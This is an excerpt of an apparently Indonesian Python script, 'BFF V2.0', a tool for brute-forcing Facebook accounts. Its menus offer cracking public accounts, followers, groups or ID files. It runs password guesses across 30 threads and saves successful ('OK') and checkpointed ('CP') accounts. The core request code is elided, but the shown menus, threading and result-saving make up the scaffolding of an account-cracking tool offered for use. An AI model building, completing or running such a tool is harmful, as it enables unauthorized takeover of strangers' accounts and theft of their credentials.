...
def banner():
 ...
 / __)  /__\  ( \( )(  _  )/ __)	{P2}author : Alvino 
( (__  /(__)\  )  (  )(_)( \__ \	{P2}recode : {H2}CANOS
 \___)(__)(__)(_)\_)(_____)(___/  
     {P2}TOOLS {H2}BFF V2.0''',width=79,title=f'[bold green]BANNER',style='bold blue'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
...
def menu(my_name,my_id):
	...
	cetak(nel(f'\t[white]Selamat Datang [yellow]{my_name} [white]Brey',width=79,style=" bold blue"))
	cetak(nel(f'[cyan][white]1.Crack Massall/Publik\n[cyan][white]2.Crack Followeres \n[cyan][white]3.Crack Gerup \n[cyan][white]4.Crack File \n[cyan][white]5.Cek Hasil \n[cyan][white]0.Keluar [white] ',width=79,title=f'[white]CRACK MENU',style='bold blue'))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('[cyan][white]1.Crack Akun Olid\n[cyan][white]2.Crcak Akun muda[white] \n[cyan][white]3.Crcak Akun Random[white] ',width=79,title=f'[white]Menu Tahun', style='bold blue'))
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		...
		exit()
	cetak(nel(f'[green]1. [white]Mobile',width=79,title=f'[white]Metodhe Menu', style='bold blue'))
#	print('>> 2. Mbasic ')
#	print('>> 3. Touch  ')
#	print('>> 4. Mtouch ')
	print('')
...
def passwrd():
	...
	sayang=[]
	sayang.append(nel(f'\t[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style="bold blue")) 
	sayang.append(nel(f'\t[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style="bold blue"))
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'mobile' in method:
					...
					pool.submit(cracmbasic,idf,pwv)
